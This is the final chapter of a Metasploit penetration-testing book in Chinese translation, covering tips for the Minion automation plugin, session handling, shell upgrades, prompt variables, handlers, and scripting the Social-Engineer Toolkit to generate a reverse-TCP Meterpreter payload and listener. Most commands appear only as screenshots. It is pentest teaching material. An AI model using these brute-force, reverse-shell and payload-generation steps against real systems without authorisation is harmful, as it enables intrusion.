在本书中，我们讨论了许多围绕 Metasploit 的技术和方法。从利用开发到脚本化 Armitage，我们涵盖了所有内容。然而，为了在 Metasploit 中实现最佳实践，我们必须了解一些技巧和窍门，以充分利用 Metasploit 框架。在本章中，我们将介绍一些快速技巧和脚本，这些将有助于使用 Metasploit 进行渗透测试。在本章中，我们将涵盖以下主题：

+   自动化脚本

+   第三方插件

+   备忘单

+   最佳实践

+   使用简写命令节省时间

因此，让我们深入探讨这最后一章，并学习一些很酷的技巧和窍门。

# 使用 Minion 脚本进行自动化

我在 GitHub 上随机查找自动化脚本时发现了这个宝藏脚本。Minion 是 Metasploit 的一个插件，对于快速利用和扫描非常有用。可以从[`github.com/T-S-A/Minion`](https://github.com/T-S-A/Minion)下载 Metasploit 的`minion`插件。

下载文件后，将其复制到`~/.msf4/plugins`目录，并启动`msfconsole`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/3c784529-c763-45f4-b9f6-986da6b7dfaa.png)

在前几章中，我们看到了如何使用 load 命令快速加载插件到 Metasploit。同样，让我们使用`load minion`命令加载`minion`插件，如前面的截图所示。加载成功后，切换到您一直在工作的工作区，或者如果工作区中没有主机，则执行 Nmap 扫描：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d19df6ba-558b-4815-b73a-7fcfbbadf834.png)

因为`db_nmap`扫描已经填充了大量结果，让我们看看启用了哪些`minion`选项可以使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4a6bf20d-da16-4751-af70-87f82c4ae853.png)

丰富！我们可以看到目标主机上有 MySQL 服务。让我们使用`mysql_enum`命令如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a529f592-5dca-45f5-8e18-2c2148a07fc8.png)

哇！我们从未加载过模块，填写过任何选项，或者启动过模块，因为`minion`插件已经为我们自动化了。我们可以看到目标主机的 MySQL 版本。让我们使用`minion`的 MySQL 攻击命令如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/eb7c6aac-5de9-4ae6-9ec8-151805809f36.png)

太棒了！Minion 插件为我们自动化了暴力攻击，结果成功登录到目标，用户名为 root，密码为空。脚本的美妙之处在于您可以编辑和自定义它，并添加更多模块和命令，这也将帮助您开发 Metasploit 的插件。

# 使用 Netcat 进行连接

Metasploit 提供了一个名为`connect`的很棒的命令，提供类似 Netcat 实用程序的功能。假设系统 shell 正在等待我们在目标系统的某个端口上连接，并且我们不想从 Metasploit 控制台切换。我们可以使用`connect`命令与目标连接，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/93733b15-1002-4f0e-bc68-c394777821dd.png)

我们可以看到我们在 Metasploit 框架内部初始化了与监听器的连接，这可能在接收反向连接时很有用，其中初始访问并非通过 Metasploit 获得。

# Shell 升级和后台会话

有时，我们不需要即时与受损主机进行交互。在这种情况下，我们可以指示 Metasploit 在利用服务后立即将新创建的会话放入后台，使用`-z`开关，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/209a37d8-732e-400b-a0a4-89fb83a2c038.png)

正如我们所看到的，我们已经打开了一个命令 shell，拥有类似 Meterpreter 提供的更好控制访问总是令人满意的。在这种情况下，我们可以使用`-u`开关升级会话，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7e06feeb-56fe-4d9e-9847-d6816e729dcc.png)

太棒了！我们刚刚将我们的 shell 更新为 Meterpreter shell，并更好地控制了目标。

# 命名约定

在一个庞大的渗透测试场景中，我们可能会得到大量的系统和 Meterpreter shell。在这种情况下，最好为所有 shell 命名以便于识别。考虑以下情景：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ca2a63aa-c451-4a25-9138-ffbfbf4735b0.png)

我们可以使用`-n`开关为 shell 命名，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2c8f481a-638d-477d-a0dd-4f8f1655c942.png)

如前面的屏幕截图所示，命名看起来更好，更容易记住。

# 更改提示符并使用数据库变量

在您喜欢的渗透测试框架上工作并拥有您的提示符是多么酷？非常容易，我会说。要在 Metasploit 中设置您的提示符，您只需要将提示符变量设置为您选择的任何内容。撇开乐趣，假设您倾向于忘记当前使用的工作区，您可以使用数据库变量`%W`的提示符，以便轻松访问，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a94735f9-ea54-4c48-ab0e-6d4e6957a9e7.png)

此外，您始终可以像下面的屏幕截图中所示的那样做一些事情：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/54b029de-89e7-453e-9e83-f7bd9d5f9d2a.png)

我们可以看到，我们已经使用`%D`显示当前本地工作目录，`%H`表示主机名，`%J`表示当前运行的作业数，`%L`表示本地 IP 地址（非常方便），`%S`表示我们拥有的会话数，`%T`表示时间戳，`%U`表示用户名，`%W`表示工作区。

# 在 Metasploit 中保存配置

大多数时候，我忘记切换到为特定扫描创建的工作区，最终将结果合并到默认工作区中。但是，使用 Metasploit 中的`save`命令可以避免这样的问题。假设您已经切换了工作区并自定义了提示符和其他内容。您可以使用`save`命令保存配置。这意味着下次启动 Metasploit 时，您将得到与上次相同的参数和工作区，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/01c5eab5-a9c9-4585-a0eb-c3af2f2d2af5.png)

让我们启动 Metasploit，看看我们上一个会话中的所有内容是否成功保存：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/eb0437b6-ef22-415e-b097-76bbdccd2040.png)

是的！一切都已在配置文件中收集。从现在开始，不再频繁切换工作区，再也不会有麻烦了。

# 使用内联处理程序和重命名作业

Metasploit 提供了使用`handler`命令快速设置处理程序的方法，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2cd2abbb-83c6-49e5-ab1c-50c688828c8f.png)

我们可以看到，我们可以使用`-p`开关来定义有效载荷，使用`-H`和`-P`开关来定义主机和端口。运行处理程序命令将快速生成一个处理程序作为后台作业。说到后台作业，它们也可以使用`rename_job`命令进行重命名，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/cf202b37-f58a-47c5-bbd9-4a58fda6d7e9.png)

# 在多个 Meterpreter 上运行命令

是的！我们可以使用`sessions`命令的`-c`开关在多个打开的 Meterpreter 会话上运行 Meterpreter 命令，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/378505be-3fc2-4857-9acf-b21c170f5f6f.png)

我们可以看到，Metasploit 已经智能地跳过了一个非 Meterpreter 会话，并且我们已经使命令在所有 Meterpreter 会话上运行，如前面的屏幕截图所示。

# 自动化社会工程工具包

**社会工程工具包**（**SET**）是一组基于 Python 的工具，针对渗透测试的人为方面。我们可以使用 SET 执行钓鱼攻击，网页劫持攻击，涉及受害者重定向的攻击，声称原始网站已经移动到其他地方，基于文件格式的利用，针对特定软件进行受害者系统的利用，以及许多其他攻击。使用 SET 的最好之处在于菜单驱动的方法，可以在很短的时间内设置快速的利用向量。

SET 的教程可以在以下网址找到：[`www.social-engineer.org/framework/se-tools/computer-based/social-engineer-toolkit-set/`](https://www.social-engineer.org/framework/se-tools/computer-based/social-engineer-toolkit-set/)。

SET 在生成客户端利用模板方面非常快速。但是，我们可以使用自动化脚本使其更快。让我们看一个例子：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a409d10f-689f-4dfe-96fa-6555781b08c7.png)

在前面的屏幕截图中，我们向`seautomate`工具提供了`se-script`，结果是生成了有效载荷并自动设置了利用处理程序。让我们更详细地分析`se-script`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d0b90fcf-42d3-47c7-a485-8628e2007786.png)

您可能想知道脚本中的数字如何调用有效载荷生成和利用处理程序设置过程。

正如我们之前讨论的，SET 是一个菜单驱动的工具。因此，脚本中的数字表示菜单选项的 ID。让我们将整个自动化过程分解为更小的步骤。

脚本中的第一个数字是`1`。因此，在处理`1`时选择了`社会工程攻击`选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/3141c845-a8b1-4e17-ad39-3c93b99160b9.png)

脚本中的下一个数字是`4`。因此，选择了`创建有效载荷和监听器`选项，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/33953706-5a0a-4042-8a3c-dfa166aaebca.png)

接下来的数字是`2`，表示有效载荷类型为`Windows Reverse_TCP Meterpreter`，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/8e158ee8-8be1-46f6-971a-8f61dc9282d1.png)

接下来，我们需要在脚本中指定监听器的 IP 地址，即`192.168.10.103`。这可以手动可视化：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/14c1cec9-5e37-4941-8606-b4d144aa3c8b.png)

在下一个命令中，我们有`4444`，这是监听器的端口号：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1a955100-20c3-4f31-a874-4d6da9c61a82.png)

我们在脚本中有`yes`作为下一个命令。脚本中的`yes`表示监听器的初始化：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/fcde75ae-a39a-4b71-99d9-3b2d664e6d2d.png)

一旦我们提供`yes`，控制就会转移到 Metasploit，并且利用反向处理程序会自动设置，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b2a54ba0-9515-4e0a-a885-2a5893ac52c3.png)

我们可以像之前讨论的那样以类似的方式自动化 SET 中的任何攻击。在为客户端利用生成定制的有效载荷时，SET 节省了大量时间。但是，使用`seautomate`工具，我们使其变得超快。

# Metasploit 和渗透测试的备忘单

您可以在以下链接找到有关 Metasploit 的一些优秀的备忘单：

+   [`www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf`](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)

+   [`null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-command-cheat-sheet-for-metasploits-meterpreter-0149146/`](https://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-command-cheat-sheet-for-metasploits-meterpreter-0149146/)

+   [`null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-list-hacking-scripts-for-metasploits-meterpreter-0149339/`](https://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-list-hacking-scripts-for-metasploits-meterpreter-0149339/)

有关渗透测试的更多信息，请参考 SANS 海报[`www.sans.org/security-resources/posters/pen-testing`](https://www.sans.org/security-resources/posters/pen-testing)，并参考[`github.com/coreb1t/awesome-pentest-cheat-sheets`](https://github.com/coreb1t/awesome-pentest-cheat-sheets)获取有关渗透测试工具和技术的大多数备忘单。

# 进一步阅读

在本书中，我们以实用的方式涵盖了 Metasploit 和其他相关主题。我们涵盖了利用开发、模块开发、在 Metasploit 中移植利用、客户端攻击、基于服务的渗透测试、规避技术、执法机构使用的技术以及 Armitage。我们还深入了解了 Ruby 编程和 Armitage 中的 Cortana 的基础知识。

阅读完本书后，您可能会发现以下资源提供了有关这些主题的更多详细信息：

+   要学习 Ruby 编程，请参阅：[`ruby-doc.com/docs/ProgrammingRuby/`](http://ruby-doc.com/docs/ProgrammingRuby/)

+   有关汇编语言编程，请参阅：[`github.com/jaspergould/awesome-asm`](https://github.com/jaspergould/awesome-asm)

+   有关利用开发，请参阅：[`www.corelan.be/`](https://www.corelan.be/)

+   有关 Metasploit 开发，请参阅：[`github.com/rapid7/metasploit-framework/wiki`](https://github.com/rapid7/metasploit-framework/wiki)

+   有关基于 SCADA 的利用，请参阅：[`scadahacker.com/`](https://scadahacker.com/)

+   有关 Metasploit 的深入攻击文档，请参阅：[`www.offensive-security.com/metasploit-unleashed/`](https://www.offensive-security.com/metasploit-unleashed/)

+   有关 Cortana 脚本的更多信息，请参阅：[`www.fastandeasyhacking.com/download/cortana/cortana_tutorial.pdf`](http://www.fastandeasyhacking.com/download/cortana/cortana_tutorial.pdf)

+   有关 Cortana 脚本资源，请参阅：[`github.com/rsmudge/cortana-scripts`](https://github.com/rsmudge/cortana-scripts)
